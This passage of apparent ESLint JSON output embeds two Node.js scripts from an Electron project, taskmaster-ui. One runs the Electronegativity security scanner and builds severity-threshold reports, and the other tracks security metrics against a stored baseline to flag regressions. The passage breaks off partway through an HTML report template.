Severity-based failure thresholds\n * - Detailed reporting with remediation suggestions\n * - Integration with development workflow\n */\n\nconst { spawn } = require('child_process');\nconst path = require('path');\nconst fs = require('fs').promises;\nconst { existsSync } = require('fs');\n\n// Configuration\nconst CONFIG = {\n  outputDir: path.join(__dirname, '../test-results/security'),\n  outputFile: 'electronegativity-results.json',\n  htmlReport: 'security-audit-report.html',\n  severityThresholds: {\n    critical: 0,  // Fail on any critical issues\n    high: 0,      // Fail on any high severity issues\n    medium: 5,    // Allow up to 5 medium severity issues\n    low: -1       // No limit on low severity issues\n  },\n  excludeChecks: [\n    // Add any checks to exclude here if needed\n    // 'CHECK_NAME_HERE'\n  ]\n};\n\n// Common Electron security issues to highlight\nconst SECURITY_PATTERNS = {\n  contextIsolation: {\n    severity: 'critical',\n    description: 'Context isolation must be enabled to prevent renderer process access to Node.js'\n  },\n  nodeIntegration: {\n    severity: 'critical',\n    description: 'Node integration should be disabled in renderer processes'\n  },\n  webSecurity: {\n    severity: 'high',\n    description: 'Web security should not be disabled'\n  },\n  allowRunningInsecureContent: {\n    severity: 'high',\n    description: 'Running insecure content should not be allowed'\n  },\n  experimentalFeatures: {\n    severity: 'medium',\n    description: 'Experimental features should be disabled in production'\n  },\n  remoteModule: {\n    severity: 'high',\n    description: 'Remote module is deprecated and should not be used'\n  }\n};\n\nclass SecurityAuditor {\n  constructor() {\n    this.results = null;\n    this.startTime = Date.now();\n  }\n\n  async run() {\n    console.log('ðŸ”’ Starting Electron Security Audit with Electronegativity...\\n');\n    \n    try {\n      // Ensure output directory exists\n      await this.ensureOutputDirectory();\n      \n      // Run Electronegativity\n      const scanResults = await this.runElectronegativity();\n      \n      // Parse and analyze results\n      this.results = await this.parseResults(scanResults);\n      \n      // Generate reports\n      await this.generateReports();\n      \n      // Check against thresholds\n      const passed = this.checkThresholds();\n      \n      // Print summary\n      this.printSummary();\n      \n      return passed;\n    } catch (error) {\n      console.error('âŒ Security audit failed:', error.message);\n      process.exit(1);\n    }\n  }\n\n  async ensureOutputDirectory() {\n    if (!existsSync(CONFIG.outputDir)) {\n      await fs.mkdir(CONFIG.outputDir, { recursive: true });\n    }\n  }\n\n  async runElectronegativity() {\n    return new Promise((resolve, reject) => {\n      const outputPath = path.join(CONFIG.outputDir, CONFIG.outputFile);\n      \n      // Build Electronegativity command\n      const args = [\n        'electronegativity',\n        '-i', '.',  // Input directory (project root)\n        '-o', outputPath,\n        '-f', 'json',\n        '-r', 'relative'  // Use relative paths in output\n      ];\n      \n      // Add exclude checks if any\n      if (CONFIG.excludeChecks.length > 0) {\n        args.push('-x', CONFIG.excludeChecks.join(','));\n      }\n      \n      console.log('Running:', 'npx', args.join(' '));\n      \n      const electronegativity = spawn('npx', args, {\n        stdio: 'pipe',\n        shell: true\n      });\n      \n      let stdout = '';\n      let stderr = '';\n      \n      electronegativity.stdout.on('data', (data) => {\n        stdout += data.toString();\n        process.stdout.write(data);\n      });\n      \n      electronegativity.stderr.on('data', (data) => {\n        stderr += data.toString();\n        process.stderr.write(data);\n      });\n      \n      electronegativity.on('close', async (code) => {\n        if (code === 0 || existsSync(outputPath)) {\n          // Even if exit code is non-zero, check if results were generated\n          try {\n            const results = await fs.readFile(outputPath, 'utf8');\n            resolve(JSON.parse(results));\n          } catch (error) {\n            // If no results file, use stdout\n            try {\n              resolve(JSON.parse(stdout));\n            } catch {\n              reject(new Error(`Failed to parse results: ${error.message}`));\n            }\n          }\n        } else {\n          reject(new Error(`Electronegativity exited with code ${code}\\n${stderr}`));\n        }\n      });\n    });\n  }\n\n  async parseResults(rawResults) {\n    // Group results by severity\n    const grouped = {\n      critical: [],\n      high: [],\n      medium: [],\n      low: [],\n      info: []\n    };\n    \n    // Ensure rawResults is an array\n    const results = Array.isArray(rawResults) ? rawResults : [];\n    \n    results.forEach(issue => {\n      const severity = (issue.severity || 'info').toLowerCase();\n      if (grouped[severity]) {\n        grouped[severity].push(issue);\n      } else {\n        grouped.info.push(issue);\n      }\n    });\n    \n    return {\n      raw: results,\n      grouped,\n      summary: {\n        total: results.length,\n        critical: grouped.critical.length,\n        high: grouped.high.length,\n        medium: grouped.medium.length,\n        low: grouped.low.length,\n        info: grouped.info.length\n      },\n      metadata: {\n        scanDate: new Date().toISOString(),\n        duration: Date.now() - this.startTime,\n        electronegativityVersion: await this.getElectronegativityVersion()\n      }\n    };\n  }\n\n  async getElectronegativityVersion() {\n    return new Promise((resolve) => {\n      const version = spawn('npx', ['electronegativity', '--version'], {\n        stdio: 'pipe',\n        shell: true\n      });\n      \n      let output = '';\n      version.stdout.on('data', (data) => {\n        output += data.toString();\n      });\n      \n      version.on('close', () => {\n        resolve(output.trim() || 'unknown');\n      });\n      \n      // Timeout fallback\n      setTimeout(() => resolve('unknown'), 5000);\n    });\n  }\n\n  async generateReports() {\n    // Save JSON report\n    const jsonPath = path.join(CONFIG.outputDir, 'security-audit-full.json');\n    await fs.writeFile(jsonPath, JSON.stringify(this.results, null, 2));\n    \n    // Generate HTML report\n    const htmlPath = path.join(CONFIG.outputDir, CONFIG.htmlReport);\n    const htmlContent = this.generateHTMLReport();\n    await fs.writeFile(htmlPath, htmlContent);\n    \n    console.log(`\\nðŸ“„ Reports generated:`);\n    console.log(`   - JSON: ${jsonPath}`);\n    console.log(`   - HTML: ${htmlPath}`);\n  }\n\n  generateHTMLReport() {\n    const { summary, grouped, metadata } = this.results;\n    \n    return `\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Electron Security Audit Report</title>\n  <style>\n    body {\n      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;\n      line-height: 1.6;\n      color: #333;\n      max-width: 1200px;\n      margin: 0 auto;\n      padding: 20px;\n      background: #f5f5f5;\n    }\n    .header {\n      background: #2c3e50;\n      color: white;\n      padding: 30px;\n      border-radius: 8px;\n      margin-bottom: 30px;\n    }\n    .summary {\n      display: grid;\n      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));\n      gap: 20px;\n      margin-bottom: 30px;\n    }\n    .metric {\n      background: white;\n      padding: 20px;\n      border-radius: 8px;\n      box-shadow: 0 2px 4px rgba(0,0,0,0.1);\n      text-align: center;\n    }\n    .metric-value {\n      font-size: 36px;\n      font-weight: bold;\n      margin: 10px 0;\n    }\n    .metric-label {\n      color: #666;\n      text-transform: uppercase;\n      font-size: 14px;\n    }\n    .critical { color: #e74c3c; }\n    .high { color: #e67e22; }\n    .medium { color: #f39c12; }\n    .low { color: #3498db; }\n    .info { color: #95a5a6; }\n    .issue {\n      background: white;\n      padding: 20px;\n      margin-bottom: 15px;\n      border-radius: 8px;\n      box-shadow: 0 2px 4px rgba(0,0,0,0.1);\n      border-left: 4px solid;\n    }\n    .issue.critical { border-left-color: #e74c3c; }\n    .issue.high { border-left-color: #e67e22; }\n    .issue.medium { border-left-color: #f39c12; }\n    .issue.low { border-left-color: #3498db; }\n    .issue.info { border-left-color: #95a5a6; }\n    .issue-header {\n      display: flex;\n      justify-content: space-between;\n      align-items: center;\n      margin-bottom: 10px;\n    }\n    .issue-title {\n      font-weight: bold;\n      font-size: 18px;\n    }\n    .issue-location {\n      color: #666;\n      font-family: monospace;\n      margin: 10px 0;\n    }\n    .issue-description {\n      margin: 10px 0;\n      line-height: 1.5;\n    }\n    .recommendations {\n      background: #ecf0f1;\n      padding: 15px;\n      border-radius: 5px;\n      margin-top: 10px;\n    }\n    .timestamp {\n      color: #666;\n      font-size: 14px;\n      text-align: center;\n      margin-top: 30px;\n    }\n  </style>\n</head>\n<body>\n  <div class=\"header\">\n    <h1>ðŸ”’ Electron Security Audit Report</h1>\n    <p>Generated by Electronegativity on ${new Date(metadata.scanDate).toLocaleString()}</p>\n    <p>Scan duration: ${(metadata.duration / 1000).toFixed(2)}s</p>\n  </div>\n\n  <div class=\"summary\">\n    <div class=\"metric\">\n      <div class=\"metric-label\">Total Issues</div>\n      <div class=\"metric-value\">${summary.total}</div>\n    </div>\n    <div class=\"metric\">\n      <div class=\"metric-label\">Critical</div>\n      <div class=\"metric-value critical\">${summary.critical}</div>\n    </div>\n    <div class=\"metric\">\n      <div class=\"metric-label\">High</div>\n      <div class=\"metric-value high\">${summary.high}</div>\n    </div>\n    <div class=\"metric\">\n      <div class=\"metric-label\">Medium</div>\n      <div class=\"metric-value medium\">${summary.medium}</div>\n    </div>\n    <div class=\"metric\">\n      <div class=\"metric-label\">Low</div>\n      <div class=\"metric-value low\">${summary.low}</div>\n    </div>\n  </div>\n\n  ${this.generateIssuesHTML(grouped.critical, 'Critical Security Issues', 'critical')}\n  ${this.generateIssuesHTML(grouped.high, 'High Security Issues', 'high')}\n  ${this.generateIssuesHTML(grouped.medium, 'Medium Security Issues', 'medium')}\n  ${this.generateIssuesHTML(grouped.low, 'Low Security Issues', 'low')}\n  ${this.generateIssuesHTML(grouped.info, 'Informational', 'info')}\n\n  <div class=\"timestamp\">\n    Report generated with Electronegativity ${metadata.electronegativityVersion}\n  </div>\n</body>\n</html>\n    `;\n  }\n\n  generateIssuesHTML(issues, title, severity) {\n    if (issues.length === 0) return '';\n    \n    const issuesHTML = issues.map(issue => `\n      <div class=\"issue ${severity}\">\n        <div class=\"issue-header\">\n          <div class=\"issue-title\">${issue.id || issue.check || 'Security Issue'}</div>\n          <div class=\"${severity}\">${severity.toUpperCase()}</div>\n        </div>\n        ${issue.file ? `<div class=\"issue-location\">ðŸ“ ${issue.file}${issue.line ? `:${issue.line}` : ''}</div>` : ''}\n        <div class=\"issue-description\">${issue.message || issue.description || 'No description available'}</div>\n        ${this.getRecommendation(issue) ? `\n          <div class=\"recommendations\">\n            <strong>Recommendation:</strong> ${this.getRecommendation(issue)}\n          </div>\n        ` : ''}\n      </div>\n    `).join('');\n    \n    return `\n      <h2>${title}</h2>\n      ${issuesHTML}\n    `;\n  }\n\n  getRecommendation(issue) {\n    // Check if issue matches known patterns\n    const checkId = issue.id || issue.check || '';\n    \n    if (checkId.includes('CONTEXT_ISOLATION')) {\n      return 'Enable context isolation in all BrowserWindow configurations: contextIsolation: true';\n    }\n    if (checkId.includes('NODE_INTEGRATION')) {\n      return 'Disable node integration in renderer processes: nodeIntegration: false';\n    }\n    if (checkId.includes('WEB_SECURITY')) {\n      return 'Never disable web security in production: webSecurity: true';\n    }\n    if (checkId.includes('REMOTE_MODULE')) {\n      return 'The remote module is deprecated. Use IPC and contextBridge for secure communication.';\n    }\n    if (checkId.includes('INSECURE_CONTENT')) {\n      return 'Prevent loading insecure content: allowRunningInsecureContent: false';\n    }\n    if (checkId.includes('OPEN_EXTERNAL')) {\n      return 'Validate URLs before opening external links. Implement a whitelist of allowed protocols.';\n    }\n    if (checkId.includes('PERMISSION')) {\n      return 'Implement proper permission request handlers for camera, microphone, etc.';\n    }\n    if (checkId.includes('CSP')) {\n      return 'Define a strict Content Security Policy to prevent XSS attacks.';\n    }\n    \n    return issue.recommendation || null;\n  }\n\n  checkThresholds() {\n    const { summary } = this.results;\n    let passed = true;\n    \n    console.log('\\nðŸŽ¯ Checking severity thresholds:');\n    \n    // Check each severity level\n    for (const [severity, count] of Object.entries(summary)) {\n      if (severity === 'total') continue;\n      \n      const threshold = CONFIG.severityThresholds[severity];\n      if (threshold !== undefined && threshold !== -1) {\n        const status = count <= threshold ? 'âœ…' : 'âŒ';\n        console.log(`   ${status} ${severity.toUpperCase()}: ${count} found (threshold: ${threshold})`);\n        \n        if (count > threshold) {\n          passed = false;\n        }\n      }\n    }\n    \n    return passed;\n  }\n\n  printSummary() {\n    const { summary } = this.results;\n    \n    console.log('\\nðŸ“Š Security Audit Summary:');\n    console.log('â”'.repeat(50));\n    console.log(`   Total Issues: ${summary.total}`);\n    console.log(`   Critical: ${summary.critical}`);\n    console.log(`   High: ${summary.high}`);\n    console.log(`   Medium: ${summary.medium}`);\n    console.log(`   Low: ${summary.low}`);\n    console.log(`   Info: ${summary.info}`);\n    console.log('â”'.repeat(50));\n    \n    // Show top issues\n    if (this.results.grouped.critical.length > 0) {\n      console.log('\\nâš ï¸  Critical issues found:');\n      this.results.grouped.critical.slice(0, 3).forEach(issue => {\n        console.log(`   - ${issue.message || issue.id}`);\n        if (issue.file) console.log(`     in ${issue.file}`);\n      });\n    }\n    \n    if (this.results.grouped.high.length > 0) {\n      console.log('\\nâš ï¸  High severity issues found:');\n      this.results.grouped.high.slice(0, 3).forEach(issue => {\n        console.log(`   - ${issue.message || issue.id}`);\n        if (issue.file) console.log(`     in ${issue.file}`);\n      });\n    }\n  }\n}\n\n// Main execution\nasync function main() {\n  const auditor = new SecurityAuditor();\n  const passed = await auditor.run();\n  \n  if (!passed) {\n    console.log('\\nâŒ Security audit failed! Fix the issues above before proceeding.');\n    process.exit(1);\n  } else {\n    console.log('\\nâœ… Security audit passed!');\n    process.exit(0);\n  }\n}\n\n// Run if called directly\nif (require.main === module) {\n  main().catch(error => {\n    console.error('Fatal error:', error);\n    process.exit(1);\n  });\n}\n\nmodule.exports = { SecurityAuditor, CONFIG };","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/scripts/scripts/security-baseline.js","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":2,"message":"'crypto' is assigned a value but never used.","line":10,"column":7,"nodeType":null,"messageId":"unusedVar","endLine":10,"endColumn":13},{"ruleId":"@typescript-eslint/no-unused-vars","severity":2,"message":"'error' is defined but never used.","line":101,"column":14,"nodeType":null,"messageId":"unusedVar","endLine":101,"endColumn":19},{"ruleId":"@typescript-eslint/no-unused-vars","severity":2,"message":"'passed' is assigned a value but never used.","line":223,"column":13,"nodeType":null,"messageId":"unusedVar","endLine":223,"endColumn":19}],"suppressedMessages":[],"errorCount":3,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Security Baseline and Regression Testing Framework\n * \n * Establishes and monitors security baselines for the Electron application\n * Tracks security metrics over time and alerts on regressions\n */\n\nconst fs = require('fs').promises;\nconst path = require('path');\nconst crypto = require('crypto');\nconst { execSync } = require('child_process');\n\n// Import security test modules\nconst { SecurityAuditor } = require('./security-audit');\nconst { DependencyVulnerabilityScanner } = require('./dependency-vulnerability-scan');\nconst { CSPSecurityTester } = require('./csp-security-test');\n\n// Baseline configuration\nconst BASELINE_CONFIG = {\n  baselineFile: path.join(__dirname, '../.taskmaster/security/security-baseline.json'),\n  historyFile: path.join(__dirname, '../.taskmaster/security/security-history.json'),\n  reportDir: path.join(__dirname, '../test-results/security'),\n  \n  // Regression thresholds\n  thresholds: {\n    scoreRegression: 5,          // Alert if score drops by 5+ points\n    newCriticalViolations: 0,    // Alert on any new critical violations\n    newHighViolations: 2,        // Alert if 2+ new high violations\n    dependencyIncrease: 10,      // Alert if vulnerable dependencies increase by 10+\n    cspScoreRegression: 10       // Alert if CSP score drops by 10+ points\n  },\n  \n  // Metrics to track\n  metrics: [\n    'electronegativity_score',\n    'dependency_vulnerabilities',\n    'csp_score',\n    'security_headers',\n    'permission_handling',\n    'ipc_security',\n    'total_violations'\n  ]\n};\n\nclass SecurityBaselineManager {\n  constructor() {\n    this.currentResults = {};\n    this.baseline = null;\n    this.history = [];\n  }\n\n  async run(options = {}) {\n    console.log('ðŸ”’ Security Baseline and Regression Testing\\n');\n    \n    try {\n      // Load existing baseline and history\n      await this.loadBaseline();\n      await this.loadHistory();\n      \n      // Run all security tests\n      console.log('ðŸ“Š Running security test suite...\\n');\n      await this.runSecurityTests();\n      \n      // Compare with baseline\n      const comparison = await this.compareWithBaseline();\n      \n      // Check for regressions\n      const regressions = this.checkForRegressions(comparison);\n      \n      // Update history\n      await this.updateHistory();\n      \n      // Generate reports\n      await this.generateReports(comparison, regressions);\n      \n      // Update baseline if requested\n      if (options.updateBaseline) {\n        await this.updateBaseline();\n        console.log('\\nâœ… Security baseline updated');\n      }\n      \n      // Print summary\n      this.printSummary(comparison, regressions);\n      \n      return {\n        passed: regressions.length === 0,\n        comparison,\n        regressions\n      };\n    } catch (error) {\n      console.error('âŒ Security baseline testing failed:', error.message);\n      return { passed: false, error: error.message };\n    }\n  }\n\n  async loadBaseline() {\n    try {\n      const baselineData = await fs.readFile(BASELINE_CONFIG.baselineFile, 'utf8');\n      this.baseline = JSON.parse(baselineData);\n      console.log('ðŸ“‹ Loaded security baseline from', new Date(this.baseline.timestamp).toLocaleDateString());\n    } catch (error) {\n      console.log('â„¹ï¸  No existing baseline found, will create new one');\n      this.baseline = null;\n    }\n  }\n\n  async loadHistory() {\n    try {\n      const historyData = await fs.readFile(BASELINE_CONFIG.historyFile, 'utf8');\n      this.history = JSON.parse(historyData);\n    } catch {\n      this.history = [];\n    }\n  }\n\n  async runSecurityTests() {\n    // Run tests in parallel for efficiency\n    const [electronegativity, dependencies, csp, electronTests] = await Promise.all([\n      this.runElectronegativity(),\n      this.runDependencyScans(),\n      this.runCSPTests(),\n      this.runElectronSecurityTests()\n    ]);\n\n    // Aggregate results\n    this.currentResults = {\n      timestamp: new Date().toISOString(),\n      commit: this.getGitCommit(),\n      branch: this.getGitBranch(),\n      \n      electronegativity: electronegativity,\n      dependencies: dependencies,\n      csp: csp,\n      electronTests: electronTests,\n      \n      // Calculate aggregate metrics\n      metrics: this.calculateMetrics({\n        electronegativity,\n        dependencies,\n        csp,\n        electronTests\n      })\n    };\n  }\n\n  async runElectronegativity() {\n    console.log('ðŸ” Running Electronegativity...');\n    \n    try {\n      const auditor = new SecurityAuditor();\n      // Mock the run method to return results instead of exiting\n      const originalExit = process.exit;\n      process.exit = () => {};\n      \n      await auditor.run();\n      \n      process.exit = originalExit;\n      \n      return {\n        passed: auditor.results.passed,\n        summary: auditor.results.summary,\n        score: 100 - (auditor.results.summary.critical * 20 + auditor.results.summary.high * 10)\n      };\n    } catch (error) {\n      console.error('Electronegativity failed:', error.message);\n      return { passed: false, error: error.message, score: 0 };\n    }\n  }\n\n  async runDependencyScans() {\n    console.log('ðŸ“¦ Running dependency vulnerability scans...');\n    \n    try {\n      const scanner = new DependencyVulnerabilityScanner();\n      const originalExit = process.exit;\n      process.exit = () => {};\n      \n      await scanner.run();\n      \n      process.exit = originalExit;\n      \n      return {\n        passed: scanner.results.summary.critical === 0,\n        summary: scanner.results.summary,\n        totalVulnerabilities: scanner.results.summary.total\n      };\n    } catch (error) {\n      console.error('Dependency scan failed:', error.message);\n      return { passed: false, error: error.message, totalVulnerabilities: -1 };\n    }\n  }\n\n  async runCSPTests() {\n    console.log('ðŸ›¡ï¸ Running CSP security tests...');\n    \n    try {\n      const tester = new CSPSecurityTester();\n      const passed = await tester.run();\n      \n      return {\n        passed: passed,\n        score: tester.results.score,\n        compliance: tester.results.compliance,\n        violations: tester.results.violations.length\n      };\n    } catch (error) {\n      console.error('CSP tests failed:', error.message);\n      return { passed: false, error: error.message, score: 0 };\n    }\n  }\n\n  async runElectronSecurityTests() {\n    console.log('âš¡ Running Electron-specific security tests...');\n    \n    try {\n      // Run Playwright Electron security tests\n      const { stdout } = execSync('npm run test -- tests/e2e/electron-security.test.ts', {\n        encoding: 'utf8',\n        stdio: 'pipe'\n      });\n      \n      // Parse test results\n      const passed = stdout.includes('passed');\n      const failedTests = (stdout.match(/failed/g) || []).length;\n      \n      return {\n        passed: failedTests === 0,\n        totalTests: 20, // Approximate from the test file\n        failedTests: failedTests\n      };\n    } catch (error) {\n      // Test command failed\n      return {\n        passed: false,\n        error: error.message,\n        totalTests: 20,\n        failedTests: 20\n      };\n    }\n  }\n\n  calculateMetrics(results) {\n    return {\n      electronegativity_score: results.electronegativity.score || 0,\n      dependency_vulnerabilities: results.dependencies.totalVulnerabilities || 0,\n      csp_score: results.csp.score || 0,\n      security_headers: results.csp.compliance?.electronSecurity ? 100 : 0,\n      permission_handling: results.electronTests.passed ? 100 : 0,\n      ipc_security: results.electronegativity.passed ? 100 : 0,\n      total_violations: (\n        (results.electronegativity.summary?.total || 0) +\n        (results.csp.violations || 0) +\n        (results.electronTests.failedTests || 0)\n      ),\n      overall_score: this.calculateOverallScore(results)\n    };\n  }\n\n  calculateOverallScore(results) {\n    const weights = {\n      electronegativity: 0.3,\n      dependencies: 0.25,\n      csp: 0.25,\n      electronTests: 0.2\n    };\n    \n    const scores = {\n      electronegativity: results.electronegativity.score || 0,\n      dependencies: results.dependencies.passed ? 100 : 50,\n      csp: results.csp.score || 0,\n      electronTests: results.electronTests.passed ? 100 : 50\n    };\n    \n    return Object.entries(weights).reduce((total, [key, weight]) => {\n      return total + (scores[key] * weight);\n    }, 0);\n  }\n\n  async compareWithBaseline() {\n    if (!this.baseline) {\n      return {\n        isNewBaseline: true,\n        changes: {},\n        improvements: [],\n        regressions: []\n      };\n    }\n\n    const comparison = {\n      isNewBaseline: false,\n      changes: {},\n      improvements: [],\n      regressions: []\n    };\n\n    // Compare each metric\n    BASELINE_CONFIG.metrics.forEach(metric => {\n      const baselineValue = this.baseline.metrics[metric];\n      const currentValue = this.currentResults.metrics[metric];\n      \n      if (baselineValue !== currentValue) {\n        const change = currentValue - baselineValue;\n        comparison.changes[metric] = {\n          baseline: baselineValue,\n          current: currentValue,\n          change: change,\n          percentChange: baselineValue > 0 ? (change / baselineValue) * 100 : 0\n        };\n        \n        // Classify as improvement or regression\n        if (metric.includes('score')) {\n          // Higher scores are better\n          if (change > 0) {\n            comparison.improvements.push({ metric, change });\n          } else if (change < 0) {\n            comparison.regressions.push({ metric, change });\n          }\n        } else if (metric.includes('vulnerabilities') || metric.includes('violations')) {\n          // Lower is better for vulnerabilities/violations\n          if (change < 0) {\n            comparison.improvements.push({ metric, change });\n          } else if (change > 0) {\n            comparison.regressions.push({ metric, change });\n          }\n        }\n      }\n    });\n\n    return comparison;\n  }\n\n  checkForRegressions(comparison) {\n    const regressions = [];\n    \n    if (comparison.isNewBaseline) {\n      return regressions;\n    }\n\n    // Check score regressions\n    Object.entries(comparison.changes).forEach(([metric, change]) => {\n      if (metric.includes('score') && Math.abs(change.change) >= BASELINE_CONFIG.thresholds.scoreRegression) {\n        regressions.push({\n          type: 'score_regression',\n          metric,\n          severity: 'high',\n          message: `${metric} dropped by ${Math.abs(change.change).toFixed(1)} points`,\n          baseline: change.baseline,\n          current: change.current\n        });\n      }\n    });\n\n    // Check for new critical violations\n    const currentCritical = this.currentResults.electronegativity?.summary?.critical || 0;\n    const baselineCritical = this.baseline?.electronegativity?.summary?.critical || 0;\n    \n    if (currentCritical > baselineCritical + BASELINE_CONFIG.thresholds.newCriticalViolations) {\n      regressions.push({\n        type: 'new_critical_violations',\n        severity: 'critical',\n        message: `${currentCritical - baselineCritical} new critical security violations detected`,\n        baseline: baselineCritical,\n        current: currentCritical\n      });\n    }\n\n    // Check dependency vulnerabilities increase\n    const vulnChange = comparison.changes.dependency_vulnerabilities;\n    if (vulnChange && vulnChange.change >= BASELINE_CONFIG.thresholds.dependencyIncrease) {\n      regressions.push({\n        type: 'dependency_regression',\n        severity: 'high',\n        message: `Vulnerable dependencies increased by ${vulnChange.change}`,\n        baseline: vulnChange.baseline,\n        current: vulnChange.current\n      });\n    }\n\n    // Check CSP score regression\n    const cspChange = comparison.changes.csp_score;\n    if (cspChange && Math.abs(cspChange.change) >= BASELINE_CONFIG.thresholds.cspScoreRegression) {\n      regressions.push({\n        type: 'csp_regression',\n        severity: 'high',\n        message: `CSP security score dropped by ${Math.abs(cspChange.change).toFixed(1)} points`,\n        baseline: cspChange.baseline,\n        current: cspChange.current\n      });\n    }\n\n    return regressions;\n  }\n\n  async updateHistory() {\n    // Add current results to history\n    this.history.push({\n      timestamp: this.currentResults.timestamp,\n      commit: this.currentResults.commit,\n      branch: this.currentResults.branch,\n      metrics: this.currentResults.metrics,\n      summary: {\n        overallScore: this.currentResults.metrics.overall_score,\n        passed: this.currentResults.electronegativity.passed && \n                this.currentResults.dependencies.passed && \n                this.currentResults.csp.passed && \n                this.currentResults.electronTests.passed\n      }\n    });\n\n    // Keep last 100 entries\n    if (this.history.length > 100) {\n      this.history = this.history.slice(-100);\n    }\n\n    // Save history\n    await this.ensureDirectoryExists(path.dirname(BASELINE_CONFIG.historyFile));\n    await fs.writeFile(BASELINE_CONFIG.historyFile, JSON.stringify(this.history, null, 2));\n  }\n\n  async updateBaseline() {\n    this.baseline = JSON.parse(JSON.stringify(this.currentResults));\n    \n    await this.ensureDirectoryExists(path.dirname(BASELINE_CONFIG.baselineFile));\n    await fs.writeFile(BASELINE_CONFIG.baselineFile, JSON.stringify(this.baseline, null, 2));\n  }\n\n  async generateReports(comparison, regressions) {\n    await this.ensureDirectoryExists(BASELINE_CONFIG.reportDir);\n    \n    // Generate JSON report\n    const jsonReport = {\n      timestamp: new Date().toISOString(),\n      baseline: this.baseline,\n      current: this.currentResults,\n      comparison,\n      regressions,\n      passed: regressions.length === 0\n    };\n    \n    const jsonPath = path.join(BASELINE_CONFIG.reportDir, 'security-baseline-report.json');\n    await fs.writeFile(jsonPath, JSON.stringify(jsonReport, null, 2));\n    \n    // Generate HTML report\n    const htmlPath = path.join(BASELINE_CONFIG.reportDir, 'security-baseline-report.html');\n    await fs.writeFile(htmlPath, this.generateHTMLReport(comparison, regressions));\n    \n    // Generate trend chart data\n    const trendPath = path.join(BASELINE_CONFIG.reportDir, 'security-trends.json');\n    await fs.writeFile(trendPath, JSON.stringify(this.generateTrendData(), null, 2));\n    \n    console.log('\\nðŸ“„ Reports generated:');\n    console.log(`   - Baseline Report: ${jsonPath}`);\n    console.log(`   - HTML Report: ${htmlPath}`);\n    console.log(`   - Trend Data: ${trendPath}`);\n  }\n\n  generateHTMLReport(comparison, regressions) {\n    const current = this.currentResults;\n    const baseline = this.baseline;\n    \n    return `\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <title>Security Baseline Report</title>\n  <style>\n    body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }\n    .header { background: #1a1a1a; color: white; padding: 20px; border-radius: 8px; }\n    .status { font-size: 24px; padding: 10px 20px; border-radius: 4px; display: inline-block; }\n    .passed { background: #10b981; color: white; }\n    .failed { background: #ef4444; color: white; }\n    .section { background: white; padding: 20px; margin: 20px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }\n    .metric { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; }\n    .metric:last-child { border-bottom: none; }\n    .improvement { color: #10b981; }\n    .regression { color: #ef4444; }\n    .neutral { color: #6b7280; }\n    .chart { width: 100%; height: 300px; margin: 20px 0; }\n    table { width: 100%; border-collapse: collapse; }\n    th, td { padding: 10px; text-align: left; border-bottom: 1px solid #eee; }\n    th { background: #f9fafb; font-weight: bold; }\n    .regression-item { background: #fef2f2; padding: 15px; margin: 10px 0; border-radius: 4px; border-left: 4px solid #ef4444; }\n    .critical { border-left-color: #dc2626; }\n  </style>\n  <script src=\"https://cdn.jsdelivr.net/npm/chart.js\"></script>\n</head>\n<body>\n  <div class=\"header\">\n    <h1>Security Baseline Report</h1>\n    <div class=\"status ${regressions.length === 0 ? 'passed' : 'failed'}\">\n      ${regressions.length === 0 ? 'âœ… PASSED' : 'âŒ FAILED'}\n    </div>\n    <p>Generated on ${new Date().toLocaleString()}</p>\n    <p>Commit: ${current.commit || 'N/A'} | Branch: ${current.branch || 'N/A'}</p>\n  </div>\n\n  ${regressions.length > 0 ? `\n    <div class=\"section\">\n      <h2>âš ï¸ Security Regressions Detected</h2>\n      ${regressions.map(r => `\n        <div class=\"regression-item ${r.severity}\">\n          <strong>${r.type.replace(/_/g, ' ').toUpperCase()}</strong>\n          <p>${r.message}</p>\n          <p>Baseline: ${r.baseline} â†’ Current: ${r.current}</p>\n        </div>\n      `).join('')}\n    </div>\n  ` : ''}\n\n  <div class=\"section\">\n    <h2>Security Metrics Comparison</h2>\n    <table>\n      <tr>\n        <th>Metric</th>\n        <th>Baseline</th>\n        <th>Current</th>\n        <th>Change</th>\n      </tr>\n      ${BASELINE_CONFIG.metrics.map(metric => {\n        const change = comparison.changes[metric];\n        const baselineValue = baseline?.metrics?.[metric] ?? 'N/A';\n        const currentValue = current.metrics[metric];\n        const changeValue = change ? change.change : 0;\n        const changeClass = changeValue > 0 ? \n          (metric.includes('score') ? 'improvement' : 'regression') :\n          (changeValue < 0 ? \n            (metric.includes('score') ? 'regression' : 'improvement') : \n            'neutral');\n        \n        return `\n          <tr>\n            <td>${metric.replace(/_/g, ' ')}</td>\n            <td>${baselineValue}</td>\n            <td>${currentValue}</td>\n            <td class=\"${changeClass}\">\n              ${changeValue > 0 ? '+' : ''}${changeValue.toFixed(1)}\n              ${change ? ` (${change.percentChange.toFixed(1)}%)` : ''}\n            </td>\n          </tr>\n        `;\n      }).join('')}\n    </table>\n  </div>\n\n  <div class=\"section\">\n    <h2>Test Results Summary</h2>\n    <div class=\"metric\">\n      <span>Electronegativity</span>\n      <span class=\"${current.electronegativity.passed ? 'improvement' : 'regression'}\">\n        ${current.electronegativity.passed ? 'âœ… Passed' : 'âŒ Failed'}\n        (Score: ${current.electronegativity.score || 0})\n      </span>\n    </div>\n    <div class=\"metric\">\n      <span>Dependency Vulnerabilities</span>\n      <span class=\"${current.dependencies.passed ? 'improvement' : 'regression'}\">\n        ${current.dependencies.totalVulnerabilities} vulnerabilities found\n      </span>\n    </div>\n    <div class=\"metric\">\n      <span>Content Security Policy</span>\n      <span class=\"${current.csp.passed ? 'improvement' : 'regression'}\">\n        ${current.csp.passed ? 'âœ… Passed' : 'âŒ Failed'}\n        (Score: ${current.csp.score || 0})\n      </span>\n    </div>\n    <div class=\"metric\">\n      <span>Electron Security Tests</span>\n      <span 